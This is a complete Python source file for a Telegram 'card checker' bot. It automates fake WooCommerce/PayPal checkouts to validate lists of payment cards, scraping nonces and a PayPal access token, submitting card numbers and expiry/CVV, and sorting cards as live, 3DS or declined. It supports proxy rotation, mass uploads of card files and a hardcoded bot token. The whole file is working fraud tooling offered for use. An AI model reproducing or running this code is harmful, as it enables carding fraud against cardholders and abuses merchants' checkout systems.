#!/usr/bin/env python3
"""MORO NOT PRO – PPCP Checker Bot (Final Deploy)"""
import asyncio, re, os, random, json, base64, threading, time, concurrent.futures
from datetime import datetime
import requests
from bs4 import BeautifulSoup
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# --- BOT CONFIG -------------------------------------------------
BOT_TOKEN = "8341603831:AAGdulwUzsWZW05UhyGAirySBzkqnVdtnQw"
GLOBAL_SITES_FILE = "sites.txt"
TIMEOUT = 10

OWNER_CHAT_ID = 5402903062   # palitan kung iba

# --- GLOBAL SITES (loaded from file) -----------------------------
global_sites = []

# --- PER-USER PROXY STORAGE (chat_id -> proxy_dict) --------------
user_proxies = {}

# --- PER-USER SITE STORAGE (chat_id -> list) ---------------------
user_sites = {}
user_site_idx = {}

# --- PENDING CARDS (chat_id -> list) -----------------------------
pending_cards = {}

# --- USER AGENTS ------------------------------------------------
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36",
]

def parse_proxy_string(s):
    s = s.strip()
    if not s: return None
    if "://" in s:
        return {"http": s, "https": s}
    return {"http": f"http://{s}", "https": f"http://{s}"}

def is_authorized(chat_id):
    return chat_id == OWNER_CHAT_ID or chat_id in user_proxies

def get_user_sites_list(chat_id):
    if chat_id in user_sites and user_sites[chat_id]:
        return user_sites[chat_id]
    if chat_id == OWNER_CHAT_ID:
        return global_sites
    return None

def get_next_site_for_user(chat_id):
    sites = get_user_sites_list(chat_id)
    if not sites:
        return None
    if chat_id not in user_site_idx:
        user_site_idx[chat_id] = 0
    idx = user_site_idx[chat_id]
    site = sites[idx % len(sites)]
    user_site_idx[chat_id] = idx + 1
    return site

# --- CLASSIFICATION ---------------------------------------------
def classify(text):
    if not text: return "error", "Empty"
    if '"result":"success"' in text and "order-received" in text: return "live", ""
    if any(k in text.upper() for k in ["PAYER_ACTION_REQUIRED","3DS","AUTHENTICATION_REQUIRED","VERIFIED_BY_VISA","OTP"]): return "vbv", ""
    if "PAYMENT_DENIED" in text: return "ccn", "LIVE CCN"
    if "INSUFFICIENT_FUNDS" in text: return "ccn", "Insufficient"
    for k in ["PAYEE_NOT_ENABLED","ORDER_NOT_APPROVED","DUPLICATE_INVOICE_ID","TRANSACTION_REFUSED",
              "Payment provider declined","We were unable to process","session has expired",
              "Failed to process the payment","Invalid payment method"]:
        if k in text: return "dead", k
    for k in ["CARD_EXPIRED","INVALID_ACCOUNT","DO_NOT_HONOR","CARD_CLOSED","INVALID_CARD",
              "CARD_NUMBER_INVALID","CVV2_CHECK_FAILED","AUTHORIZATION_ERROR","RESTRICTED_CARD"]:
        if k in text: return "dead", k
    m = re.search(r'"issue"\s*:\s*"([^"]+)"', text)
    if not m: m = re.search(r'"name"\s*:\s*"([^"]+)"', text)
    return "dead", m.group(1) if m else "DECLINED"

# --- PRODUCT EXTRACTOR ------------------------------------------
def extract_product(session, base):
    try:
        r = session.get(base+"/shop/", timeout=TIMEOUT)
        s = BeautifulSoup(r.text,"html.parser")
        a = s.find("a", href=re.compile(r"add-to-cart=(\d+)"))
        if a: return re.search(r"add-to-cart=(\d+)",a["href"]).group(1)
        e = s.find(attrs={"data-product_id":True})
        if e: return e["data-product_id"]
    except: pass
    return None

# --- PPCP CHECKOUT ----------------------------------------------
def checkout(site_url, card_line, proxies=None):
    parts = card_line.split("|")
    if len(parts)<4: return None
    cc,mm,yy,cvv = parts[0],parts[1],parts[2],parts[3]
    mm = mm.zfill(2); yy = "20"+yy[-2:]
    card_str = f"{cc}|{mm}|{yy}|{cvv}"
    s = requests.Session()
    s.headers.update({"User-Agent": random.choice(UAS)})
    if proxies:
        s.proxies = proxies
    base = site_url.rstrip("/")
    try:
        pid = extract_product(s, base)
        if not pid: return card_str,"error","No product"
        s.get(f"{base}/?add-to-cart={pid}", timeout=TIMEOUT)
        r = s.get(f"{base}/checkout/", timeout=TIMEOUT)
        h = r.text
        nonce = re.search(r'woocommerce-process-checkout-nonce"[^>]*value="([^"]+)"', h)
        if not nonce: nonce = re.search(r'"process_checkout_nonce"\s*:\s*"([^"]+)"', h)
        if not nonce: return card_str,"error","No nonce"
        nonce_val = nonce.group(1)
        cn = nonce_val
        m = re.search(r'"create_order"[^}]*"nonce"\s*:\s*"([^"]+)"', h)
        if m: cn = m.group(1)
        an = nonce_val
        m = re.search(r'"approve_order"[^}]*"nonce"\s*:\s*"([^"]+)"', h)
        if m: an = m.group(1)
        client_nonce = ""
        m = re.search(r'"data_client_id"[^}]*"nonce"\s*:\s*"([^"]+)"', h)
        if m: client_nonce = m.group(1)
        access_token = ""
        if client_nonce:
            r_tok = s.post(f"{base}/?wc-ajax=ppc-data-client-id",
                json={"set_attribute":True,"nonce":client_nonce,"user":"0",
                      "has_subscriptions":False,"paypal_subscriptions_enabled":False},
                headers={"X-Requested-With":"XMLHttpRequest"}, timeout=TIMEOUT)
            token_b64 = r_tok.json().get("token","")
            if token_b64:
                try:
                    decoded = json.loads(base64.b64decode(token_b64).decode("utf-8"))
                    access_token = decoded.get("paypal",{}).get("accessToken","")
                except: pass
        if not access_token:
            return card_str,"error","No access token"
        r = s.post(f"{base}/?wc-ajax=ppc-create-order", json={
            "nonce":cn, "payer":None, "bn_code":"Woo_PPCP", "context":"checkout",
            "order_id":"0", "order_key":"", "payment_method":"ppcp-credit-card-gateway",
            "form_encoded":"", "createaccount":False, "save_payment_method":False
        }, headers={"X-Requested-With":"XMLHttpRequest"}, timeout=TIMEOUT)
        oid = (r.json().get("order_id") or r.json().get("data",{}).get("id") or r.json().get("data",{}).get("order_id"))
        if not oid: return card_str,"error","No order ID"
        s.post(f"https://api.paypal.com/v2/checkout/orders/{oid}/confirm-payment-source",
            json={"payment_source":{"card":{"number":cc,"security_code":cvv,"expiry":f"{yy}-{mm}"}}},
            headers={"Authorization":f"Bearer {access_token}","Accept":"application/json",
                     "Origin":"https://www.paypal.com"}, timeout=TIMEOUT)
        s.post(f"{base}/?wc-ajax=ppc-approve-order",
            json={"nonce":an,"order_id":oid,"funding_source":"card"},
            headers={"X-Requested-With":"XMLHttpRequest"}, timeout=TIMEOUT)
        pay_data = {
            "billing_first_name":"Test","billing_last_name":"User",
            "billing_country":"US","billing_address_1":"123 Main St",
            "billing_city":"New York","billing_state":"NY",
            "billing_postcode":"10001","billing_phone":"5555555555",
            "billing_email":"test@test.com",
            "payment_method":"ppcp-credit-card-gateway",
            "woocommerce-process-checkout-nonce":nonce_val,
            "_wp_http_referer":"/?wc-ajax=update_order_review",
        }
        r_pay = s.post(f"{base}/?wc-ajax=checkout", data=pay_data,
            headers={"X-Requested-With":"XMLHttpRequest"}, timeout=TIMEOUT)
        status, reason = classify(r_pay.text)
        if status=="dead" and '"status":"COMPLETED"' in r_pay.text:
            status, reason = "live", "Approved"
        return card_str, status, reason
    except Exception as e:
        return card_str,"error", str(e)[:80]

# --- BIN LOOKUP -------------------------------------------------
def bin_lookup(bin_number, proxies=None):
    try:
        resp = requests.get(f"https://lookup.binlist.net/{bin_number}",
                            headers={"Accept": "application/json"}, proxies=proxies, timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            scheme = data.get("scheme", "Unknown")
            brand = data.get("brand", "Unknown")
            bank = data.get("bank", {}).get("name", "Unknown")
            country = data.get("country", {}).get("name", "Unknown")
            ccy = data.get("country", {}).get("currency", "Unknown")
            return (f"<pre>"
                    f"BIN        : {bin_number}\n"
                    f"Brand      : {scheme} ({brand})\n"
                    f"Bank       : {bank}\n"
                    f"Country    : {country}\n"
                    f"Currency   : {ccy}"
                    f"</pre>")
        else:
            return f"<pre>BIN {bin_number}: Lookup failed (HTTP {resp.status_code})</pre>"
    except Exception as e:
        return f"<pre>BIN {bin_number}: Error ({str(e)[:50]})</pre>"

# --- SITE MANAGEMENT COMMANDS ------------------------------------
async def addsite_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Provide a URL. Example: <code>/addsite https://example.com</code>", parse_mode="HTML")
        return
    url = " ".join(context.args).strip()
    if not url.startswith("http"):
        await update.message.reply_text("❌ URL must start with http:// or https://")
        return
    chat_id = update.effective_chat.id
    if chat_id not in user_sites:
        user_sites[chat_id] = []
    user_sites[chat_id].append(url)
    await update.message.reply_text(f"✅ Site added. Total personal sites: {len(user_sites[chat_id])}")

async def removesite_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Provide a URL to remove.")
        return
    url = " ".join(context.args).strip()
    chat_id = update.effective_chat.id
    if chat_id not in user_sites or url not in user_sites[chat_id]:
        await update.message.reply_text("❌ Site not found in your list.")
        return
    user_sites[chat_id].remove(url)
    await update.message.reply_text(f"✅ Site removed. Remaining: {len(user_sites[chat_id])}")

async def mysites_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    sites = get_user_sites_list(chat_id)
    if not sites:
        await update.message.reply_text("ℹ️ You have no sites. Add one with /addsite <url>.")
        return
    text = "<b>Your Sites:</b>\n" + "\n".join(f"• {s}" for s in sites)
    await update.message.reply_text(text, parse_mode="HTML")

async def clearsites_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_sites.pop(chat_id, None)
    await update.message.reply_text("✅ All your sites have been cleared.")

# --- STYLISH HANDLERS -------------------------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🔍 START CHECK", callback_data="start_check")],
        [InlineKeyboardButton("📂 MASS CHECK", callback_data="mass_check")],
        [InlineKeyboardButton("⚙️ SET PROXY", callback_data="set_proxy")],
        [InlineKeyboardButton("➕ ADD SITE", callback_data="add_site"),
         InlineKeyboardButton("📋 MY SITES", callback_data="my_sites")],
        [InlineKeyboardButton("🟢 APPROVE", callback_data="filter_approve"),
         InlineKeyboardButton("🟡 CCN CHARGE", callback_data="filter_ccn")],
        [InlineKeyboardButton("🟣 3DS", callback_data="filter_vbv"),
         InlineKeyboardButton("🔵 DECLINED", callback_data="filter_declined"),
         InlineKeyboardButton("🔴 ERROR", callback_data="filter_error")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "<b>🔥 MORO NOT PRO – PPCP Card Checker Bot 🔥</b>\n\n"
        "<i>Commands:</i>\n"
        "/check <code>card</code> - single check\n"
        "/setproxy <code>proxy</code> - set your proxy\n"
        "/addsite <code>url</code> - add a PPCP site\n"
        "/mysites - view your sites\n"
        "/removesite <code>url</code> - remove a site\n"
        "/clearsites - clear all your sites\n\n"
        "<b>Note:</b> Non‑owner users must set a proxy AND add sites before checking.",
        parse_mode="HTML", reply_markup=reply_markup
    )

async def set_proxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Provide a proxy. Example: <code>/setproxy http://user:pass@host:port</code>", parse_mode="HTML")
        return
    proxy_str = " ".join(context.args)
    chat_id = update.effective_chat.id
    pd = parse_proxy_string(proxy_str)
    if pd:
        user_proxies[chat_id] = pd
        await update.message.reply_text(f"✅ Proxy set to <code>{proxy_str}</code>", parse_mode="HTML")
    else:
        await update.message.reply_text("❌ Invalid proxy format.")

async def clear_proxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in user_proxies:
        del user_proxies[chat_id]
        await update.message.reply_text("✅ Proxy cleared.")
    else:
        await update.message.reply_text("ℹ️ No proxy was set.")

async def unified_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    chat_id = update.effective_chat.id

    if data == "start_check":
        await query.edit_message_text("📝 Use <code>/check 4147203737085130|05|2030|567</code>")
    elif data == "mass_check":
        await query.edit_message_text("📤 Please upload your <b>cards.txt</b> file now.", parse_mode="HTML")
    elif data == "set_proxy":
        await query.edit_message_text("⚙️ Send me your proxy:\n<code>/setproxy http://user:pass@host:port</code>", parse_mode="HTML")
    elif data == "add_site":
        await query.edit_message_text("➕ Send me the URL:\n<code>/addsite https://example.com</code>", parse_mode="HTML")
    elif data == "my_sites":
        sites = get_user_sites_list(chat_id)
        if sites:
            text = "<b>Your Sites:</b>\n" + "\n".join(f"• {s}" for s in sites)
        else:
            text = "ℹ️ You have no personal sites. Add one with /addsite."
        await query.edit_message_text(text, parse_mode="HTML")
    elif data.startswith("filter_"):
        await query.edit_message_text(f"🔍 Filter by {data.replace('filter_','').upper()} coming soon.")
    elif data.startswith("bin|"):
        card_line = data[4:]
        parts = card_line.split("|")
        if len(parts) >= 1:
            bin_number = parts[0][:6]
            loop = asyncio.get_running_loop()
            info = await loop.run_in_executor(None, bin_lookup, bin_number, user_proxies.get(chat_id))
            await query.edit_message_text(info, parse_mode="HTML")
    elif data == "start_processing":
        if not is_authorized(chat_id):
            await query.edit_message_text("❌ You need to set a proxy first. Use /setproxy.")
            return
        if get_user_sites_list(chat_id) is None:
            await query.edit_message_text("❌ You need to add sites first. Use /addsite <url>.")
            return
        lines = pending_cards.pop(chat_id, [])
        if not lines:
            await query.edit_message_text("❌ No cards found or already processed.")
            return
        total = len(lines)

        await query.edit_message_text(
            f"📂 Received {total} cards. Processing started...",
            parse_mode="HTML"
        )

        progress_msg = await context.bot.send_message(
            chat_id=chat_id,
            text=f"📂 Processing {total} cards...",
            parse_mode="HTML"
        )

        results = {"live":[], "ccn":[], "vbv":[], "dead":0, "error":0}
        proxy = user_proxies.get(chat_id)
        lock = threading.Lock()

        def process_one(line):
            site = get_next_site_for_user(chat_id)
            if not site:
                return
            res = checkout(site, line, proxies=proxy)
            if res:
                cs, status, reason = res
                with lock:
                    if status == "live":
                        results["live"].append(cs)
                    elif status == "ccn":
                        results["ccn"].append(f"{cs} ({reason})")
                    elif status == "vbv":
                        results["vbv"].append(cs)
                    elif status == "dead":
                        results["dead"] += 1
                    else:
                        results["error"] += 1

        loop = asyncio.get_running_loop()
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
            await asyncio.gather(*[loop.run_in_executor(pool, process_one, line) for line in lines])

        await progress_msg.edit_text("✅ Processing complete. Sending results...")

        summary = (f"<b>Results:</b>\n"
                   f"🟢 LIVE: {len(results['live'])}\n"
                   f"🟡 CCN: {len(results['ccn'])}\n"
                   f"🟣 VBV: {len(results['vbv'])}\n"
                   f"🔵 DECLINED: {results['dead']}\n"
                   f"🔴 ERROR: {results['error']}")
        await context.bot.send_message(chat_id=chat_id, text=summary, parse_mode="HTML")

        all_good = results["live"] + results["ccn"] + results["vbv"]
        if all_good:
            box_content = "\n".join(all_good)
            msg = f"✅ GOOD CARDS:\n\n<pre>{box_content}</pre>"
            await context.bot.send_message(chat_id=chat_id, text=msg, parse_mode="HTML")

async def check_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not is_authorized(chat_id):
        await update.message.reply_text("❌ You need to set a proxy first. Use /setproxy.")
        return
    if get_user_sites_list(chat_id) is None:
        await update.message.reply_text("❌ You need to add sites first. Use /addsite <url>.")
        return
    if not context.args:
        await update.message.reply_text("❌ Provide a card. Example: <code>/check 4147203737085130|05|2030|567</code>", parse_mode="HTML")
        return
    card_line = " ".join(context.args)
    msg = await update.message.reply_text("⏳ Checking your card...")
    site = get_next_site_for_user(chat_id)
    if not site:
        await msg.edit_text("❌ No sites available.")
        return
    loop = asyncio.get_running_loop()
    result = await loop.run_in_executor(None, checkout, site, card_line, user_proxies.get(chat_id))
    if not result:
        await msg.edit_text("❌ Invalid card format.")
        return
    cs, status, reason = result

    if status == "live":
        emoji = "✅ LIVE"
        btn_text = "👁️ BIN INFO"
    elif status == "ccn":
        emoji = "⚠️ CCN"
        btn_text = "👁️ BIN INFO"
    elif status == "vbv":
        emoji = "🛡️ VBV/3DS"
        btn_text = "👁️ BIN INFO"
    elif status == "dead":
        emoji = "❌ DECLINED"
        btn_text = "👁️ BIN INFO"
    else:
        emoji = "⚠️ ERROR"
        btn_text = "👁️ BIN INFO"

    keyboard = [[InlineKeyboardButton(btn_text, callback_data=f"bin|{card_line}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    card_box = f"<pre>{cs}</pre>"
    await msg.edit_text(f"<b>{emoji}</b>\n\n{card_box}", parse_mode="HTML", reply_markup=reply_markup)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not is_authorized(chat_id):
        await update.message.reply_text("❌ You need to set a proxy first. Use /setproxy.")
        return
    if get_user_sites_list(chat_id) is None:
        await update.message.reply_text("❌ You need to add sites first. Use /addsite <url>.")
        return
    file = await update.message.document.get_file()
    content = (await file.download_as_bytearray()).decode("utf-8")
    lines = [l.strip() for l in content.split("\n") if l.strip() and "|" in l]
    if not lines:
        await update.message.reply_text("❌ No valid cards found.")
        return
    pending_cards[chat_id] = lines
    keyboard = [[InlineKeyboardButton("▶️ START PROCESSING", callback_data="start_processing")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"📂 Received <b>{len(lines)}</b> cards.\nPress START to begin checking.",
        parse_mode="HTML", reply_markup=reply_markup
    )

# --- MAIN -------------------------------------------------------
def main():
    global global_sites
    if os.path.exists(GLOBAL_SITES_FILE):
        with open(GLOBAL_SITES_FILE) as f:
            global_sites = [l.strip() for l in f if l.strip() and l.startswith("http")]
    else:
        global_sites = []

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("setproxy", set_proxy_cmd))
    app.add_handler(CommandHandler("clearproxy", clear_proxy_cmd))
    app.add_handler(CommandHandler("addsite", addsite_cmd))
    app.add_handler(CommandHandler("removesite", removesite_cmd))
    app.add_handler(CommandHandler("mysites", mysites_cmd))
    app.add_handler(CommandHandler("clearsites", clearsites_cmd))
    app.add_handler(CallbackQueryHandler(unified_callback))
    app.add_handler(CommandHandler("check", check_card))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_document))

    print("Bot is running... Press Ctrl+C to stop.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
